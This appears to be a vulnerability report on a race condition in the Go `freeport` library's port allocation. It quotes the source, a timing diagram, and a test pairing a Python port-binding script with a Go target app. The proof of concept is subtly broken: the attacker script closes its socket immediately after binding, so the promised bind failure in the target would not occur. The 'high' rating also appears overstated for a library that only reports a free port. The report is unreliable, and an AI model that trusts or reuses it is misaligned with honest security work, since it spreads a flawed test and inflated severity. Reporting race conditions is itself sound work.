## Vulnerability Report

This report details a Time-of-Check Time-of-Use (TOCTOU) vulnerability identified in the port allocation mechanism of the `freeport` library.

### Time-of-Check Time-of-Use (TOCTOU) vulnerability in port allocation

- **Description:**
    1. The `GetFreePort` function requests a free port from the operating system.
    2. The operating system provides a port that is currently free.
    3. The `GetFreePort` function then closes the socket immediately after obtaining the port number.
    4. There is a time window between when `GetFreePort` identifies a port as free and when the application using `freeport` attempts to bind to and use that port.
    5. During this time window, a malicious local attacker can attempt to bind to the same port.
    6. If the attacker successfully binds to the port before the legitimate application, the legitimate application will fail to bind to the intended port or will bind to a different port, potentially leading to service disruption or other security implications.

- **Impact:**
    A local attacker can hijack the port intended for use by another application that uses the `freeport` library. This can lead to:
    - Service disruption: The intended application might fail to start if it cannot bind to the expected port.
    - Port hijacking: The attacker can bind to the port and potentially intercept or manipulate traffic intended for the legitimate application if the application falls back to using the hijacked port or a different port.
    - Unexpected application behavior: If the application logic depends on using a specific port, hijacking the port can lead to unexpected behavior and potentially further vulnerabilities.

- **Vulnerability Rank:** high

- **Currently Implemented Mitigations:**
    None. The code in `freeport.go` does not implement any mitigation for this TOCTOU vulnerability. The intended behavior of the library is to simply return a free port, and it does not attempt to reserve or guarantee exclusive access to the port for the caller.

- **Missing Mitigations:**
    To mitigate this vulnerability, the `freeport` library could:
    - Attempt to bind to the port and keep the socket open, returning the open socket to the caller. This would ensure that the port is reserved for the caller, but it would also change the API and usage of the library. This approach is generally not recommended as the library's purpose is to just find a free port, not manage socket lifecycle.
    - Document the TOCTOU vulnerability clearly and advise users to be aware of this race condition and implement their own retry or port reservation mechanisms at the application level.

- **Preconditions:**
    - The attacker must be running code on the same machine where the application using `freeport` is running.
    - The attacker must have sufficient privileges to bind to TCP ports on the system.

- **Source Code Analysis:**
    File: `/code/freeport.go`

    ```go
    func GetFreePort() (int, error) {
        addr, err := net.ResolveTCPAddr("tcp", "localhost:0") // Step 1: Resolve TCP address with port 0
        if err != nil {
            return 0, err
        }

        l, err := net.ListenTCP("tcp", addr) // Step 2: Listen on the resolved address, kernel assigns free port here
        if err != nil {
            return 0, err
        }
        defer l.Close() // Step 3: Immediately close the listener
        return l.Addr().(*net.TCPAddr).Port, nil // Step 4: Return the assigned port number
    }
    ```

    The vulnerability arises because the listener `l` is closed immediately using `defer l.Close()`. After `GetFreePort` returns the port number, the port is free again.  Another process can quickly bind to this port before the original application attempts to use it.

    ```
    [Time]        [GetFreePort()]                      [Application]                      [Attacker]
    -------------------------------------------------------------------------------------------------
    T1          Resolve TCP addr "localhost:0"
    T2          ListenTCP -> Kernel assigns port P
    T3          Close listener
    T4          Return port P
                -------------------- Port P is now free --------------------
    T5                               Application receives port P
    T6                               Application attempts to bind to port P
    T7                                                                   Attacker attempts to bind to port P
    T8          Application bind fails (if attacker is faster) OR succeeds
    ```

- **Security Test Case:**

    1. **Attacker Setup:**
        - Create a script `attacker.py` (or similar in any language) that attempts to bind to a specific TCP port in a loop. This script will take the port number as a command-line argument.

        ```python
        # attacker.py
        import socket
        import sys
        import time

        port = int(sys.argv[1])
        print(f"Attacker trying to bind to port {port}")
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('localhost', port))
                print(f"Attacker successfully bound to port {port}")
                s.close()
                break # Successfully bound, exit loop
            except Exception as e:
                #print(f"Bind failed: {e}") # Optional: print error messages for debugging
                time.sleep(0.001) # Small delay to avoid excessive CPU usage
        ```

    2. **Target Application Setup:**
        - Create a Go program `target_app.go` that uses `freeport.GetFreePort()` to get a port and then attempts to bind to it after a short delay to simulate a real application's startup time.

        ```go
        // target_app.go
        package main

        import (
            "fmt"
            "log"
            "net"
            "time"

            "github.com/phayes/freeport"
        )

        func main() {
            port, err := freeport.GetFreePort()
            if err != nil {
                log.Fatalf("Error getting free port: %v", err)
            }
            fmt.Printf("Free port obtained: %d\n", port)

            time.Sleep(1 * time.Second) // Simulate application delay

            ln, err := net.Listen("tcp", fmt.Sprintf("localhost:%d", port))
            if err != nil {
                fmt.Printf("Target app failed to bind to port %d: %v\n", port, err)
            } else {
                fmt.Printf("Target app successfully bound to port %d\n", port)
                ln.Close() // Clean up listener
            }
        }
        ```

    3. **Execution Steps:**
        - Compile the Go target application: `go build target_app.go`
        - Run the target application and the attacker script in separate terminals simultaneously.
        - First, run the target application to get a free port and print it: `./target_app` (Note down the "Free port obtained: XXXX" number)
        - Immediately in another terminal, run the attacker script, providing the port number obtained in the previous step: `python attacker.py XXXX` (Replace XXXX with the actual port number).

    4. **Expected Result:**
        - The attacker script should likely be able to bind to the port before the target application in many cases, especially with a 1-second delay in the target application.
        - The output of `attacker.py` should show "Attacker successfully bound to port XXXX".
        - The output of `target_app` should show "Target app failed to bind to port XXXX: ...bind: address already in use...".  The exact error message might vary slightly depending on the OS.

    5. **Verification:**
        - If the test case consistently shows that the attacker can bind to the port before the target application, it confirms the TOCTOU vulnerability.
        - Reduce or remove the `time.Sleep` in `target_app.go` and re-run to see if the race condition is still reproducible, though it might become less frequent if the target application attempts to bind very quickly.

This test case demonstrates that a local attacker can exploit the TOCTOU vulnerability to hijack a port obtained by `freeport`, leading to a failure for the legitimate application to bind to its intended port.